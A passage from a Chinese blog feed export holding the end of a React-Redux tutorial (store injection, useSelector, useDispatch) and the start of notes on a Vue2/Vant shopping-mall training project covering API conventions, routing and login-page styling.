#D4D4D4"> </span><span style="color: #C586C0">default</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">store</span><span style="color: #D4D4D4">;</span></span></code></pre></div></div></figure><p>由于子模块导出时，使用的是 <code>export default</code> 方式，所以可以重新命名为 counterReducer 以供 reducer 管理。此处的 reducer 和子模块的 reducer 类似一群孩子和监护人的关系，各个子模块的 reducer 由此处 index.js 的 reducer 管理。</p><h3 id="store-注入-react"><a class="markdownIt-Anchor" href="#store-注入-react"></a> Store 注入 React</h3><p>react-redux 负责把 Redux 和 React 链接起来，内置 Provider 组件通过 store 参数把创建好的 store 实例注入到应用，<br>链接正式建立。</p><p>在由 Vite 创建的项目中，找到 <code>src\main.jsx</code> 文件（如果是 npm 创建则是 index.js）：</p><figure class="shiki jsx"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #C586C0">import</span><span style="color: #D4D4D4"> { </span><span style="color: #9CDCFE">StrictMode</span><span style="color: #D4D4D4"> } </span><span style="color: #C586C0">from</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">"react"</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #C586C0">import</span><span style="color: #D4D4D4"> { </span><span style="color: #9CDCFE">createRoot</span><span style="color: #D4D4D4"> } </span><span style="color: #C586C0">from</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">"react-dom/client"</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #C586C0">import</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">"./index.css"</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #C586C0">import</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">App</span><span style="color: #D4D4D4"> </span><span style="color: #C586C0">from</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">"./App.jsx"</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #C586C0">import</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">store</span><span style="color: #D4D4D4"> </span><span style="color: #C586C0">from</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">"./store"</span><span style="color: #D4D4D4">; </span><span style="color: #6A9955">// 导入store</span></span><span class="line"><span style="color: #C586C0">import</span><span style="color: #D4D4D4"> { </span><span style="color: #9CDCFE">Provider</span><span style="color: #D4D4D4"> } </span><span style="color: #C586C0">from</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">"react-redux"</span><span style="color: #D4D4D4">; </span><span style="color: #6A9955">// 导入Provider</span></span><span class="line"></span><span class="line"><span style="color: #DCDCAA">createRoot</span><span style="color: #D4D4D4">(</span><span style="color: #9CDCFE">document</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">getElementById</span><span style="color: #D4D4D4">(</span><span style="color: #CE9178">"root"</span><span style="color: #D4D4D4">)).</span><span style="color: #DCDCAA">render</span><span style="color: #D4D4D4">(</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #808080">&lt;</span><span style="color: #4EC9B0">StrictMode</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #808080">&lt;</span><span style="color: #4EC9B0">Provider</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">store</span><span style="color: #D4D4D4">=</span><span style="color: #569CD6">{</span><span style="color: #9CDCFE">store</span><span style="color: #569CD6">}</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #808080">&lt;</span><span style="color: #4EC9B0">App</span><span style="color: #D4D4D4"> </span><span style="color: #808080">/&gt;</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #808080">&lt;/</span><span style="color: #4EC9B0">Provider</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #808080">&lt;/</span><span style="color: #4EC9B0">StrictMode</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">);</span></span></code></pre></div></div></figure><p>使用 Provide 将 App 包裹，并指定好 store 属性，就可以在 React 中使用 redux 了。</p><h3 id="在组件中使用-store"><a class="markdownIt-Anchor" href="#在组件中使用-store"></a> 在组件中使用 store</h3><p>找到 App.jsx 修改为如下代码：</p><figure class="shiki jsx"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #C586C0">import</span><span style="color: #D4D4D4"> { </span><span style="color: #9CDCFE">useSelector</span><span style="color: #D4D4D4"> } </span><span style="color: #C586C0">from</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">"react-redux"</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #569CD6">function</span><span style="color: #D4D4D4"> </span><span style="color: #DCDCAA">App</span><span style="color: #D4D4D4">() {</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #569CD6">const</span><span style="color: #D4D4D4"> { </span><span style="color: #4FC1FF">count</span><span style="color: #D4D4D4"> } = </span><span style="color: #DCDCAA">useSelector</span><span style="color: #D4D4D4">((</span><span style="color: #9CDCFE">state</span><span style="color: #D4D4D4">) </span><span style="color: #569CD6">=&gt;</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">state</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">counter</span><span style="color: #D4D4D4">);</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #C586C0">return</span><span style="color: #D4D4D4"> (</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">div</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">className</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"App"</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">button</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">onClick</span><span style="color: #D4D4D4">=</span><span style="color: #569CD6">{</span><span style="color: #D4D4D4">() </span><span style="color: #569CD6">=&gt;</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">console</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">log</span><span style="color: #D4D4D4">(</span><span style="color: #CE9178">"-clicked"</span><span style="color: #D4D4D4">)</span><span style="color: #569CD6">}</span><span style="color: #808080">&gt;</span><span style="color: #D4D4D4">-</span><span style="color: #808080">&lt;/</span><span style="color: #569CD6">button</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">span</span><span style="color: #808080">&gt;</span><span style="color: #569CD6">{</span><span style="color: #9CDCFE">count</span><span style="color: #569CD6">}</span><span style="color: #808080">&lt;/</span><span style="color: #569CD6">span</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">button</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">onClick</span><span style="color: #D4D4D4">=</span><span style="color: #569CD6">{</span><span style="color: #D4D4D4">() </span><span style="color: #569CD6">=&gt;</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">console</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">log</span><span style="color: #D4D4D4">(</span><span style="color: #CE9178">"+clicked"</span><span style="color: #D4D4D4">)</span><span style="color: #569CD6">}</span><span style="color: #808080">&gt;</span><span style="color: #D4D4D4">+</span><span style="color: #808080">&lt;/</span><span style="color: #569CD6">button</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #808080">&lt;/</span><span style="color: #569CD6">div</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">  );</span></span><span class="line"><span style="color: #D4D4D4">}</span></span><span class="line"></span><span class="line"><span style="color: #C586C0">export</span><span style="color: #D4D4D4"> </span><span style="color: #C586C0">default</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">App</span><span style="color: #D4D4D4">;</span></span></code></pre></div></div></figure><p>这个地方的 state 参数 <code>state =&gt; state.counter</code> 指的其实是 sotre 的 index.js 文件中的 reducer 中的 counter：</p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202411142117502.png" alt="image-20241114211731362" style="zoom:50%;"><p>不过现在只能显示数据，而不能修改。</p><h3 id="修改数据"><a class="markdownIt-Anchor" href="#修改数据"></a> 修改数据</h3><div class="note info flat"><p>React 组件中修改 store 中的数据需要借助另外一个 hook 函数：<code>useDispatch</code></p><p>它的作用是生成提交 action 对象的 dispatch 函数。</p></div><p><code>App.jsx</code></p><figure class="shiki jsx"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #C586C0">import</span><span style="color: #D4D4D4"> { </span><span style="color: #9CDCFE">useSelector</span><span style="color: #D4D4D4">, </span><span style="color: #9CDCFE">useDispatch</span><span style="color: #D4D4D4"> } </span><span style="color: #C586C0">from</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">"react-redux"</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #C586C0">import</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">decrement</span><span style="color: #D4D4D4">,</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">increment</span><span style="color: #D4D4D4">,</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">incrementByAmount</span><span style="color: #D4D4D4">,</span></span><span class="line"><span style="color: #D4D4D4">} </span><span style="color: #C586C0">from</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">"./store/modules/counterStore"</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #569CD6">function</span><span style="color: #D4D4D4"> </span><span style="color: #DCDCAA">App</span><span style="color: #D4D4D4">() {</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #569CD6">const</span><span style="color: #D4D4D4"> { </span><span style="color: #4FC1FF">count</span><span style="color: #D4D4D4"> } = </span><span style="color: #DCDCAA">useSelector</span><span style="color: #D4D4D4">((</span><span style="color: #9CDCFE">state</span><span style="color: #D4D4D4">) </span><span style="color: #569CD6">=&gt;</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">state</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">counter</span><span style="color: #D4D4D4">);</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #569CD6">const</span><span style="color: #D4D4D4"> </span><span style="color: #4FC1FF">dispatch</span><span style="color: #D4D4D4"> = </span><span style="color: #DCDCAA">useDispatch</span><span style="color: #D4D4D4">();</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #569CD6">let</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">amount</span><span style="color: #D4D4D4"> = </span><span style="color: #B5CEA8">0</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #569CD6">function</span><span style="color: #D4D4D4"> </span><span style="color: #DCDCAA">handleAmountChange</span><span style="color: #D4D4D4">(</span><span style="color: #9CDCFE">e</span><span style="color: #D4D4D4">) {</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">amount</span><span style="color: #D4D4D4"> = </span><span style="color: #9CDCFE">e</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">target</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">value</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">  }</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #C586C0">return</span><span style="color: #D4D4D4"> (</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">div</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">className</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"App"</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">input</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #9CDCFE">type</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"text"</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #9CDCFE">placeholder</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"Enter amount"</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #9CDCFE">onChange</span><span style="color: #D4D4D4">=</span><span style="color: #569CD6">{</span><span style="color: #9CDCFE">handleAmountChange</span><span style="color: #569CD6">}</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #808080">/&gt;</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">button</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">onClick</span><span style="color: #D4D4D4">=</span><span style="color: #569CD6">{</span><span style="color: #D4D4D4">() </span><span style="color: #569CD6">=&gt;</span><span style="color: #D4D4D4"> </span><span style="color: #DCDCAA">dispatch</span><span style="color: #D4D4D4">(</span><span style="color: #DCDCAA">incrementByAmount</span><span style="color: #D4D4D4">(</span><span style="color: #9CDCFE">amount</span><span style="color: #D4D4D4">))</span><span style="color: #569CD6">}</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">        confirm</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #808080">&lt;/</span><span style="color: #569CD6">button</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">br</span><span style="color: #D4D4D4"> </span><span style="color: #808080">/&gt;</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">button</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">onClick</span><span style="color: #D4D4D4">=</span><span style="color: #569CD6">{</span><span style="color: #D4D4D4">() </span><span style="color: #569CD6">=&gt;</span><span style="color: #D4D4D4"> </span><span style="color: #DCDCAA">dispatch</span><span style="color: #D4D4D4">(</span><span style="color: #DCDCAA">decrement</span><span style="color: #D4D4D4">())</span><span style="color: #569CD6">}</span><span style="color: #808080">&gt;</span><span style="color: #D4D4D4">-</span><span style="color: #808080">&lt;/</span><span style="color: #569CD6">button</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">span</span><span style="color: #808080">&gt;</span><span style="color: #569CD6">{</span><span style="color: #9CDCFE">count</span><span style="color: #569CD6">}</span><span style="color: #808080">&lt;/</span><span style="color: #569CD6">span</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">button</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">onClick</span><span style="color: #D4D4D4">=</span><span style="color: #569CD6">{</span><span style="color: #D4D4D4">() </span><span style="color: #569CD6">=&gt;</span><span style="color: #D4D4D4"> </span><span style="color: #DCDCAA">dispatch</span><span style="color: #D4D4D4">(</span><span style="color: #DCDCAA">increment</span><span style="color: #D4D4D4">())</span><span style="color: #569CD6">}</span><span style="color: #808080">&gt;</span><span style="color: #D4D4D4">+</span><span style="color: #808080">&lt;/</span><span style="color: #569CD6">button</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #808080">&lt;/</span><span style="color: #569CD6">div</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">  );</span></span><span class="line"><span style="color: #D4D4D4">}</span></span><span class="line"></span><span class="line"><span style="color: #C586C0">export</span><span style="color: #D4D4D4"> </span><span style="color: #C586C0">default</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">App</span><span style="color: #D4D4D4">;</span></span></code></pre></div></div></figure><p>在这段代码中，使用 <code>dispatch</code> 方法并传入 <code>increment()</code> 时，它实际上是调用导入了的 <code>increment</code> 这个 action creator 函数，这个函数会返回一个 action 对象。例如：</p><figure class="shiki js"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #D4D4D4">{</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #C8C8C8">type</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">"counter/increment"</span><span style="color: #D4D4D4">; </span><span style="color: #6A9955">// 这是类型自动生成的字符串</span></span><span class="line"><span style="color: #D4D4D4">}</span></span></code></pre></div></div></figure><h3 id="异步状态操作"><a class="markdownIt-Anchor" href="#异步状态操作"></a> 异步状态操作</h3><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> React </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>GO-SHOPPING 商城项目笔记</title>
      <link href="/posts/47412.html"/>
      <url>/posts/47412.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdnjs.cloudflare.com/ajax/libs/hint.css/2.7.0/hint.min.css"><meta name="referrer" content="no-referrer"><blockquote><p>本项目是基于 uni-app 技术栈开发的，能够运行在多端 (微信小程序、h5、ios/Android) 的移动端商城项目。</p></blockquote><ul><li>重点：接口需要 token 的地方，header 中， Access-Token:${token}</li><li> 重点：接口需要 platform 的地方，header 中，platform: h5 或 mp-weixin</li><li> 接口调用基础地址：<a href="http://smart-shop.itheima.net/index.php?s=/api">http://smart-shop.itheima.net/index.php?s=/api</a></li><li> 关于接口的说明：分为了 http 状态码和接口中 code 对应码</li></ul><table><thead><tr><th style="text-align:left">码值</th><th style="text-align:left">说明</th></tr></thead><tbody><tr><td style="text-align:left"> http 状态码 500</td><td style="text-align:left"> 服务器端异常</td></tr><tr><td style="text-align:left"> http 状态码 404</td><td style="text-align:left"> 服务器端异常</td></tr><tr><td style="text-align:left"> http 状态码 401</td><td style="text-align:left"> 授权信息不正确</td></tr></tbody></table><blockquote><p>测试环境，登录短信验证码统一为：246810 （不再提供真实的短信验证服务）</p><p><a href="https://apifox.com/apidoc/shared-12ab6b18-adc2-444c-ad11-0e60f5693f66/doc-2221080">接口文档地址</a></p><p><a href="https://youzan.github.io/vant/v2/#/zh-CN/">Vant2 官网地址</a></p><p>本项目使用 <code>ESLint+Standard config</code> 的代码规范标准</p></blockquote><h2 id="项目结构"><a class="markdownIt-Anchor" href="#项目结构"></a> 项目结构</h2><meta name="description" content="记录学习过的Vue2商城项目，写法接近uniapp，稍加改造可以成为uniapp项目">## 一级路由配置<p>将每个基础的一级页面以文件夹形式存放于 views 包中。包括：</p><p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202408281710771.png" alt="image-20240828171025686">具体项目结构如下：<br><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202408281709022.png" alt="image-20240828170920935" style="zoom:80%;"></p><p>路由页如下：<br><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202408281711591.png" alt="image-20240828171139419" style="zoom: 50%;"></p><h2 id="二级路由配置"><a class="markdownIt-Anchor" href="#二级路由配置"></a> 二级路由配置</h2><h3 id="实现底部导航栏-tabbar"><a class="markdownIt-Anchor" href="#实现底部导航栏-tabbar"></a> 实现底部导航栏 Tabbar</h3><p>配置二级路由之前需要完成底部 Tabbar 栏的设计，可以结合 vant 官网文档进行设计。<a href="https://youzan.github.io/vant/v2/">vant2 官网</a><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202408281712602.png" alt="image-20240828171252550"></p><h3 id="实现二级路由配置"><a class="markdownIt-Anchor" href="#实现二级路由配置"></a> 实现二级路由配置</h3><p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202408281741912.png" alt="image-20240828174123840"></p><p>在组件中的 vant2 的 Tabbar 要实现路由模式如下：</p><p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202408281744188.png" alt="image-20240828174450143"></p><p>于是有：</p><figure class="shiki vue"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #808080">&lt;</span><span style="color: #569CD6">div</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">    &lt;router-view&gt;&lt;/router-view&gt;</span></span><span class="line"><span style="color: #D4D4D4">    &lt;van-tabbar route v-model="active" active-color="#ee0a24" inactive-color="#000"&gt;</span></span><span class="line"><span style="color: #D4D4D4">      &lt;van-tabbar-item to= "/home" icon="gem-o"&gt;首页&lt;/van-tabbar-item&gt;</span></span><span class="line"><span style="color: #D4D4D4">      &lt;van-tabbar-item to= "/category" icon="apps-o"&gt;分类页&lt;/van-tabbar-item&gt;</span></span><span class="line"><span style="color: #D4D4D4">      &lt;van-tabbar-item to= "/cart" icon="shopping-cart-o"&gt;购物车&lt;/van-tabbar-item&gt;</span></span><span class="line"><span style="color: #D4D4D4">      &lt;van-tabbar-item to= "/user" icon="user-o"&gt;我的&lt;/van-tabbar-item&gt;</span></span><span class="line"><span style="color: #D4D4D4">    &lt;/van-tabbar&gt;</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #808080">&lt;/</span><span style="color: #569CD6">div</span><span style="color: #808080">&gt;</span></span></code></pre></div></div></figure><p>最后优化路由逻辑，将默认匹配的页面重定向到 home</p><p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202408281748077.png" alt="image-20240828174814027"></p><h2 id="登录静态页"><a class="markdownIt-Anchor" href="#登录静态页"></a> 登录静态页</h2><p>新建 <code>styles/common.less</code> 重置默认样式（可以对一些想要多组件生效的样式进行重新调整）</p><figure class="shiki less"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #6A9955">// 重置默认样式</span></span><span class="line"><span style="color: #D4D4D4">* {</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">margin</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">0</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">padding</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">0</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">box-sizing</span><span style="color: #D4D4D4">: </span><span style="color: #569CD6">borde-box</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">}</span></span><span class="line"></span><span class="line"><span style="color: #6A9955">// 文字溢出省略号</span></span><span class="line"><span style="color: #D7BA7D">.text-ellipsis-2</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">overflow</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">hidden</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">-webkit-line-clamp</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">2</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">text-overflow</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">ellipsis</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">display</span><span style="color: #D4D4D4">: -webkit-box;</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">-webkit-box-orient</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">vertical</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">}</span></span></code></pre></div></div></figure><p>导入于 main.js 中：<code>import '@/styles/common.less'</code></p><p>接着准备一些素材图片于 assets<br><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202408281759229.png" alt="image-20240828175944181"></p><h3 id="配置头部-navbar"><a class="markdownIt-Anchor" href="#配置头部-navbar"></a> 配置头部 NavBar</h3><figure class="shiki vue"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #6A9955">&lt;!-- 头部 NavBar --&gt;</span></span><span class="line"><span style="color: #808080">&lt;</span><span style="color: #569CD6">van-nav-bar</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">title</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"尊敬的用户，请登录"</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">left-arrow</span></span><span class="line"><span style="color: #D4D4D4">  @</span><span style="color: #9CDCFE">click-left</span><span style="color: #D4D4D4">=</span><span style="color: #D4D4D4">"</span><span style="color: #9CDCFE">$router</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">go</span><span style="color: #D4D4D4">(-</span><span style="color: #B5CEA8">1</span><span style="color: #D4D4D4">)</span><span style="color: #D4D4D4">"</span></span><span class="line"><span style="color: #D4D4D4">/&gt;</span></span></code></pre></div></div></figure><p><code>$router.go(-1)</code> 的作用是返回上一页。</p><p>接着将左边的返回符号 left-arrow 颜色样式改为灰色 #333，于是找到 common.less 进行编写（两个类名增加权重）</p><figure class="shiki less"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #6A9955">// 添加导航的通用样式</span></span><span class="line"><span style="color: #D7BA7D">.van-nav-bar</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #D7BA7D">.van-nav-bar__arrow</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">color</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">#333</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">  }</span></span><span class="line"><span style="color: #D4D4D4">}</span></span></code></pre></div></div></figure><p>这样的好处是，一旦配置好了将来其他页面使用到导航栏此处的返回颜色都是我们此时配好的颜色。这就是通用样式的覆盖。</p><h3 id="完善主体"><a class="markdownIt-Anchor" href="#完善主体"></a> 完善主体</h3><p>接着编写主体的静态结构：</p><figure class="shiki vue"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span 